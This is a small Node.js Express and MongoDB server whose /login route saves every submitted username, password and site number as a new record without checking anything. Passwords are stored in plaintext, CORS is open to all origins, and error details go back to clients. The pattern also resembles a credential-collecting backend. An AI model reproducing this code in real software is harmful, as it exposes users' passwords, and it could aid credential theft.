const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
const mongoURI = 'mongodb://localhost:27017/loginData'; // Update with your MongoDB URI
mongoose
  .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB Connected'))
  .catch((err) => console.error('MongoDB connection error:', err));

// Mongoose Schema and Model
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  siteNumber: { type: String, required: true },
});

const User = mongoose.model('User', UserSchema);

// Route to Handle User Data Submission
app.post('/login', async (req, res) => {
  const { username, password, siteNumber } = req.body;

  if (!username || !password || !siteNumber) {
    return res.status(400).json({ message: 'All fields are required' });
  }

  try {
    const newUser = new User({ username, password, siteNumber });
    await newUser.save();
    res.status(201).json({ message: 'User data saved successfully!' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error });
  }
});

// Start the Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
